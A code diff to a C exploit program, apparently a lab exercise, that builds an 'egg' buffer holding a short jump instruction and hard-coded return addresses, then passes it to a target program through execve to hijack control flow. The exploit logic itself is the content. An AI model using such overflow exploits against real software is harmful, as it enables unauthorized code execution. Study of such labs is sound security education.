@@ -16,22 +16,18 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-  long shellcodeAddr, *addrPtr, fpAddr, dummyVal, jumpInstr;
+  long retAddr, retLoc, jumpInstruction;
   char egg[EGG_SIZE]; /* string containing exploit code */
   int i;
 
-  shellcodeAddr = 0x08049C68; // address of buff
-  jumpInstr = 0xFFFF06EB; // jump instr
-  fpAddr = 0xBFFFFA3C; // addr of eip for foo
+  retAddr = 0x08049C68; // address of buff
+  jumpInstruction = 0xFFFF06EB; // jump instr
+  retLoc = 0xBFFFFA3C; // addr of eip for foo
 
-  addrPtr = (long *) egg; 
-  for (i = 0; i < EGG_SIZE; i += 4)
-    *(addrPtr++) = 0xFFFFFFFF;
-
-  memcpy(&egg[504], &shellcodeAddr, 4);
-  memcpy(&egg[508], &fpAddr, 4);
-  memcpy(&egg[3], &dummyVal, 4);
-  memcpy(egg, &jumpInstr, 2);
+  memset (egg, 1, EGG_SIZE);
+  memcpy (&egg[504], &retAddr, 4);
+  memcpy (&egg[508], &retLoc, 4);
+  memcpy (egg, &jumpInstruction, 2);
 
 
   /* Then fill the first bytes of the exploit string with
@@ -43,8 +39,8 @@ int main(void)
   args[0] = TARGET; args[1] = egg; args[2] = NULL;
   env[0] = NULL;
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+  if (0 > execve (TARGET, args, env))
+    fprintf (stderr, "execve failed.\n");
 
   return 0;
 }
